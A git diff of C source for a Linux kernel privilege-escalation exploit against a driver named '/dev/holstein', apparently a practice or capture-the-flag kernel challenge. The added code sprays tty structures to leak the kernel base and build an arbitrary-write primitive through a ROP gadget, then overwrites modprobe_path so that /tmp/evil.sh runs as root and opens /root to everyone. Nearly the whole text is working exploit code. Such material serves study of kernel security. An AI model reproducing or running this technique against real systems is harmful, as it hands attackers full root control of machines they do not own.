@@ -137,7 +137,7 @@ void exp_kaslr(int fd, uint64_t *chain)
     *chain++ = state.ss;
 }
 
-void exp_1()
+void exp_tty_struct()
 {
     save_state(&state);
     // Spraying the heap
@@ -199,7 +199,7 @@ void exp_1()
     // set the tty_buf to point to our g_buf
     *(uint64_t *)&buf[0x418] = g_buf + 0x400;
     info("Writing to device");
-    write(fd1, buf, 0x500);
+    write(fd1, buf, 0x420);
 
     // get RIP
     for (int i = 0; i < 100; i++)
@@ -219,9 +219,93 @@ void exp_1()
     close(fd1);
 }
 
+void aaw32(int fd1, char *buf, int *spray, uint64_t addr, uint32_t val)
+{
+    uint64_t rop_mov_prdx_rcx = kaslr(0x0477f7); // mov [rdx], rcx ; ret
+    uint64_t *p = (uint64_t *)buf;
+    p[12] = rop_mov_prdx_rcx;
+
+    *(uint64_t *)&buf[0x418] = g_buf;
+    write(fd1, buf, BUFFER_SIZE);
+
+    for (int i = 0; i < 100; i++)
+    {
+        // RCX: 00000000deadbeef
+        // RDX: 00000000cafebabe
+        // RSI: 00000000deadbeef
+        // R08: 00000000cafebabe
+        // R12: 00000000deadbeef
+        // R14: 00000000cafebabe
+
+        // r13, rbp. Reason for this is first we can control the rip but not stack
+        // so we need to stack piviot and set the stack to point to the heap. Without this we can bypass kpti since it uses rsp to switch kernel stack to user stack
+        ioctl(spray[i], val, addr);
+    }
+}
+void exp_mod_probe()
+{
+    save_state(&state);
+    // Spraying the heap
+    int spray[100];
+    for (int i = 0; i < 50; i++)
+    {
+        spray[i] = open("/dev/ptmx", O_RDONLY);
+        if (spray[i] < 0)
+        {
+            err("Failed to open /dev/ptmx");
+        }
+    }
+
+    int fd1 = open("/dev/holstein", O_RDWR);
+    if (fd1 < 0)
+    {
+        err("Failed to open device");
+    }
+
+    // Spraying the heappp
+    for (int i = 50; i < 100; i++)
+    {
+        spray[i] = open("/dev/ptmx", O_RDONLY);
+        if (spray[i] < 0)
+        {
+            err("Failed to open /dev/ptmx");
+        }
+    }
+
+    // Leak kaslr
+    char buf[BUFFER_SIZE] = {0};
+    if (read(fd1, buf, sizeof(buf)) < 0)
+    {
+        err("Failed to read from device");
+    }
+
+    const uint64_t ofs_tty_ops = 0xc38880;
+    kbase = *(uint64_t *)(buf + 0x418) - ofs_tty_ops;
+    info("Kernel base: 0x%lx", kbase);
+
+    g_buf = *(uint64_t *)(buf + 0x438) - 0x438;
+    info("Global buffer: 0x%lx", g_buf);
+    uint64_t addr_modprobe_path = kaslr(0xe38180);
+
+    info("writing to modprobe addr 0x%lx", addr_modprobe_path);
+    char cmd[] = "/tmp/evil.sh";
+
+    for (int i = 0; i < sizeof(cmd); i += 4)
+    {
+        aaw32(fd1, buf, spray, addr_modprobe_path + i, *(unsigned int *)&cmd[i]);
+    }
+
+    system("echo -e '#!/bin/sh\nchmod -R 777 /root' > /tmp/evil.sh");
+    system("chmod +x /tmp/evil.sh");
+    system("echo -e '\xde\xad\xbe\xef' > /tmp/pwn");
+    system("chmod +x /tmp/pwn");
+    system("/tmp/pwn");
+}
+
 int main()
 {
-    exp_1();
+    // exp_tty_struct();
+    exp_mod_probe();
 
     return 0;
 }
